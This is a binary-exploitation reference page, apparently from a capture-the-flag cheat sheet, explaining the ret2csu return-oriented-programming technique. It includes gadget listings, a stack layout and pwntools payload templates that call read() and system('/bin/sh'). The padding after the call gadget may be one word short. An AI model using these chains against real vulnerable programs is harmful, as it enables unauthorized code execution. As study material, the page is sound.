# ret2csu

**When:** You need to call a function with 3 arguments but lack `pop rdi`/`pop rsi`/`pop rdx` gadgets. Uses the `__libc_csu_init` function common in gcc-compiled binaries.

**Prerequisites:**

- `__libc_csu_init` present (two specific gadget sequences at the end)
- Known address of these gadgets

## How it works

`__libc_csu_init` provides two gadgets:

```
Gadget 1 (csu_pop) - at the end of the function:
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

Gadget 2 (csu_call) - in the middle:
mov rdx, r14       # arg3 from r14
mov rsi, r13       # arg2 from r13
mov edi, r12d      # arg1 from r12d (lower 32 bits of r12)
call [r15 + rbx*8] # call pointer at r15+8*rbx
```

To call `func(arg1, arg2, arg3)`:

1. Set rbx=0, rbp=1 (rbp=1 passes the check `cmp rbx, rbp; jnb`)
2. Set r12=arg1, r13=arg2, r14=arg3
3. Set r15=&func_GOT (or wherever the function pointer lives)

```
Stack layout:
+------------------+
| csu_pop          |  <- first return
+------------------+
| 0                |  <- rbx = 0
+------------------+
| 1                |  <- rbp = 1 (must be 1 for the check)
+------------------+
| arg1             |  <- r12 -> edi
+------------------+
| arg2             |  <- r13 -> rsi
+------------------+
| arg3             |  <- r14 -> rdx
+------------------+
| &func_GOT        |  <- r15 -> [r15+rbx*8] = [&func_GOT]
+------------------+
| csu_call         |  <- executes the call
+------------------+
| 0                |  <- rbx (popped again by csu_call's epilogue)
+------------------+
| 0                |  <- rbp
+------------------+
| 0                |  <- r12
+------------------+
| 0                |  <- r13
+------------------+
| 0                |  <- r14
+------------------+
| 0                |  <- r15
+------------------+
| next_chain      |  <- continues ROP after csu_call returns
+------------------+
```

## Code

```python
csu_pop = 0x40123a   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401220  # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

# Example: call read(0, bss, 0x100)
payload = flat([
    csu_pop,
    0,                  # rbx = 0
    1,                  # rbp = 1 (passes cmp check)
    0,                  # r12 -> edi = 0 (fd = stdin)
    e.bss(),            # r13 -> rsi = BSS (buf)
    0x100,              # r14 -> rdx = 0x100 (count)
    e.got['read'],      # r15 -> [r15] = read
    csu_call,           # call read(0, bss, 0x100)
    0, 0, 0, 0, 0, 0,  # padding for pops after call
    next_rop,           # continue
])
```

## Calling a function without a GOT entry

If the function doesn't have a GOT entry (not imported), store its address in BSS and point r15 there:

```python
# Store system address in BSS (via a previous read call)
# Then:
r15 = e.bss() + offset_of_system_addr
payload = flat([
    csu_pop,
    0, 1,
    binsh_addr,     # r12 -> rdi = "/bin/sh"
    0,              # r13 -> rsi = NULL
    0,              # r14 -> rdx = NULL
    r15,            # r15 -> [r15] = system address
    csu_call,
    ...
])
```
